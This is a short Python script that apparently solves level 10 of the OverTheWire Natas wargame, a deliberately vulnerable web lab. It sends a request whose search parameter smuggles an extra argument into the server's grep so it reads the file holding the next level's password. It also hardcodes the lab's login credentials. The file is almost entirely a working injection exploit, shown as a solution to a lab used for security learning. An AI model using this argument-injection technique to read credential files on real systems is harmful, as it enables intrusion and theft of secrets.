import requests

url="http://natas10.natas.labs.overthewire.org/index.php?needle=.*+%2Fetc%2Fnatas_webpass%2Fnatas11+%23&submit=Search"
exploit=requests.session()
exploit.auth=('natas10','nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu')
request=exploit.get(url)
#password has been in the source
print(request.text)